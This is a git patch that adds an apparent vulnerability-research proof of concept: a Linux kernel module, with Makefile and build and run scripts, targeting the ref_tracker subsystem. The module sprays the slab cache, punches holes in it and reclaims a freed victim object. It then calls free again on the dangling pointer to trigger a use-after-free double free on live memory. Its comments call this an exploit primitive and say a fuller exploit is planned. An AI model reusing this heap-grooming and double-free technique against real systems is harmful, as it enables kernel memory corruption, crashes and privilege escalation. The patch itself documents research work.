From 594c70059bbf5542d6ef9455ab843c7f0eb0f317 Mon Sep 17 00:00:00 2001
From: Shardul Bankar <shardulsb08@gmail.com>
Date: Fri, 27 Jun 2025 02:33:39 +0530
Subject: [PATCH] ref_tracker_test: Exploit double free condition

---
 exploit_poc/Makefile          |   7 +++
 exploit_poc/compile.sh        |   4 ++
 exploit_poc/run.sh            |   3 +
 exploit_poc/uaf_exploit_poc.c | 102 ++++++++++++++++++++++++++++++++++
 4 files changed, 116 insertions(+)
 create mode 100644 exploit_poc/Makefile
 create mode 100755 exploit_poc/compile.sh
 create mode 100644 exploit_poc/run.sh
 create mode 100644 exploit_poc/uaf_exploit_poc.c

diff --git a/exploit_poc/Makefile b/exploit_poc/Makefile
new file mode 100644
index 000000000000..28b77f89effe
--- /dev/null
+++ b/exploit_poc/Makefile
@@ -0,0 +1,7 @@
+obj-m += uaf_exploit_poc.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
diff --git a/exploit_poc/compile.sh b/exploit_poc/compile.sh
new file mode 100755
index 000000000000..cef8e15a8135
--- /dev/null
+++ b/exploit_poc/compile.sh
@@ -0,0 +1,4 @@
+# We are inside the container, at the path /build/linux/exploit_poc/
+
+# Command to build the module:
+make -C /build/linux M=$(pwd) modules
diff --git a/exploit_poc/run.sh b/exploit_poc/run.sh
new file mode 100644
index 000000000000..5f0564318cac
--- /dev/null
+++ b/exploit_poc/run.sh
@@ -0,0 +1,3 @@
+sudo mount -t 9p -o trans=virtio host_out /host_out/
+cd /host_out/linux/exploit_poc/
+echo "sudo insmod uaf_exploit_poc.ko"
diff --git a/exploit_poc/uaf_exploit_poc.c b/exploit_poc/uaf_exploit_poc.c
new file mode 100644
index 000000000000..ebada694da27
--- /dev/null
+++ b/exploit_poc/uaf_exploit_poc.c
@@ -0,0 +1,102 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * ref_tracker Use-After-Free Exploit Primitive PoC (v6 - Slab Manipulation)
+ *
+ * This version uses a "hole punching" technique to gain more control
+ * over the slab allocator and force a reuse of the victim object's memory.
+ * This is a more advanced and realistic exploit primitive.
+ * Report: This PoC triggers an alarm confirming that we can reach the
+ * ref_tracker_* double free call. Will create a proper exploit in next version.
+ */
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/slab.h>
+#include <linux/ref_tracker.h>
+
+#define ALLOC_COUNT 200
+#define VICTIM_INDEX 50 // An arbitrary index to target
+
+static int __init uaf_exploit_poc_init(void)
+{
+	struct ref_tracker_dir dir;
+	struct ref_tracker *spray_objects[ALLOC_COUNT] = { NULL };
+	struct ref_tracker *attacker_obj = NULL;
+	void *victim_addr = NULL;
+	int i;
+
+	pr_info("UAF_POC: --- Phase 2.5: Starting Slab Manipulation PoC ---\n");
+	BUG_ON(VICTIM_INDEX >= ALLOC_COUNT || VICTIM_INDEX % 2 != 0);
+
+	ref_tracker_dir_init(&dir, ALLOC_COUNT + 10, "exploit_test");
+
+	// 1. Allocate a large, contiguous set of objects to control the slab cache.
+	pr_info("UAF_POC: Step 1: Allocating %d objects to control the slab.\n", ALLOC_COUNT);
+	for (i = 0; i < ALLOC_COUNT; i++) {
+		if (ref_tracker_alloc(&dir, &spray_objects[i], GFP_KERNEL) != 0) {
+			pr_err("UAF_POC: Allocation failed at index %d, aborting.\n", i);
+			// Cleanup what we have
+			while (--i >= 0)
+				ref_tracker_free(&dir, &spray_objects[i]);
+			ref_tracker_dir_exit(&dir);
+			return -ENOMEM;
+		}
+	}
+
+	// 2. Create "holes" in the cache by freeing every other object.
+	// This prepares the freelist with a known pattern.
+	pr_info("UAF_POC: Step 2: Creating holes in the slab cache.\n");
+	for (i = 0; i < ALLOC_COUNT; i += 2) {
+		ref_tracker_free(&dir, &spray_objects[i]);
+	}
+
+	// 3. Free our specific victim object.
+	// This places our target object at the HEAD of the per-cpu freelist.
+	victim_addr = spray_objects[VICTIM_INDEX];
+	pr_info("UAF_POC: Step 3: Freeing victim object at index %d (%px).\n", VICTIM_INDEX, victim_addr);
+	ref_tracker_free(&dir, &spray_objects[VICTIM_INDEX]);
+
+	// 4. Attacker reclaims the memory.
+	// The very next allocation from this cache on this CPU should be the
+	// memory slot from our victim object.
+	pr_info("UAF_POC: Step 4: Attacker allocating one object to reclaim victim's memory.\n");
+	if (ref_tracker_alloc(&dir, &attacker_obj, GFP_KERNEL) != 0) {
+		pr_err("UAF_POC: Attacker allocation failed!\n");
+		// Full cleanup is complex here, just exit.
+		ref_tracker_dir_exit(&dir);
+		return -ENOMEM;
+	}
+
+	// 5. Verify the exploit primitive.
+	if (attacker_obj != victim_addr) {
+		pr_err("UAF_POC: FAIL - Memory reuse failed! Attacker got %px.\n", attacker_obj);
+		ref_tracker_free(&dir, &attacker_obj);
+		ref_tracker_dir_exit(&dir);
+		return -EAGAIN;
+	}
+
+	pr_info("UAF_POC: SUCCESS! Attacker object at %px has reclaimed the victim's memory.\n", attacker_obj);
+	pr_info("UAF_POC: The `dead` flag has been zeroed by kzalloc.\n");
+
+	// 6. Trigger the UAF.
+	// We now call free again on the victim's dangling pointer. This will bypass
+	// the `dead` check and call kfree() on the live attacker_obj.
+	pr_warn("UAF_POC: Step 6: Triggering UAF on live memory at %px. Expect kernel crash...\n", victim_addr);
+	ref_tracker_free(&dir, &spray_objects[VICTIM_INDEX]);
+
+	pr_err("UAF_POC: KERNEL SURVIVED - This indicates the exploit failed.\n");
+	ref_tracker_free(&dir, &attacker_obj); // Final free
+	ref_tracker_dir_exit(&dir);
+	return -EFAULT;
+}
+
+static void __exit uaf_exploit_poc_exit(void)
+{
+	pr_info("UAF_POC: Module unloaded.\n");
+}
+
+module_init(uaf_exploit_poc_init);
+module_exit(uaf_exploit_poc_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Vulnerability Researcher");
+MODULE_DESCRIPTION("PoC for ref_tracker UAF (v6 - Slab Manipulation)");
-- 
2.34.1

